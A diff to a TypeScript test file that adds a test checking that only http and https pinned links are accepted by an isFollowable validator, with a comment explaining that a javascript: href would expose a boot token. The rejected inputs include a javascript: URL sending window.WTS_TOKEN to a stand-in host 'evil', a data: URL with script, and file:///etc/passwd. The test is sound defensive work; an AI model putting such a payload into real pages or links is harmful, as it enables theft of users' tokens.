@@ -22,6 +22,7 @@ import {
   coercePorts,
   coerceStart,
   upsertGroup,
+  isFollowable,
 } from '../server/settings.ts';
 
 test('the bare-string form of `start` SURVIVES — the regression that lost two repos', () => {
@@ -143,4 +144,33 @@ test('upsertGroup refuses a group with no name or no members, and changes nothin
 test('upsertGroup coerces what it is handed', () => {
   const out = upsertGroup([], { name: '  spaced  ', members: [' be/x ', ''] } as never);
   assert.deepEqual(out, [{ name: 'spaced', members: ['be/x'] }]);
+});
+
+/*
+ * A pinned link is rendered into an href in a page that holds the boot token, so the
+ * scheme is not a formatting detail — `javascript:` there is a one-click read of the
+ * token. The client refuses to render one; this is the half that keeps it from being
+ * written to config.json in the first place, which matters because that file outlives
+ * any particular client and is also hand-edited.
+ */
+test('only http and https survive as followable links', () => {
+  for (const ok of [
+    'http://example.com',
+    'https://example.com/path?q=1#frag',
+    'https://app.asana.com/1/123/project/456/task/789',
+  ]) {
+    assert.equal(isFollowable(ok), true, `${ok} is an ordinary link`);
+  }
+
+  for (const bad of [
+    'javascript:fetch("http://evil/"+window.WTS_TOKEN)',
+    'JavaScript:alert(1)', // scheme matching must not be case-sensitive
+    'data:text/html,<script>1</script>',
+    'file:///etc/passwd',
+    'example.com', // scheme-less: refused, not helpfully prefixed
+    '',
+    '   ',
+  ]) {
+    assert.equal(isFollowable(bad), false, `${JSON.stringify(bad)} must not reach an href`);
+  }
 });
